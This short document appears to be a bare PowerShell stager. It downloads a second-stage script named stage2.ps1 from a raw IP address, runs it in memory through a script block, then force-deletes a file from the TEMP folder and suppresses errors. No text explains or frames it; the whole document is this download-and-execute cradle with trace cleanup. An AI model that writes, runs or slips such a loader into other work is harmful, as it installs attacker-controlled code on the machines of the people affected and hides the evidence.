
try { $FetchUrl = "http://198.51.100.203/stage2.ps1"; $ScriptText = (New-Object Net.WebClient).DownloadString($FetchUrl); & ([ScriptBlock]::Create($ScriptText)); Remove-Item -Path "$env:TEMP\stage2.bin" -Force } catch { Write-Warning "Remote fetch failed" }
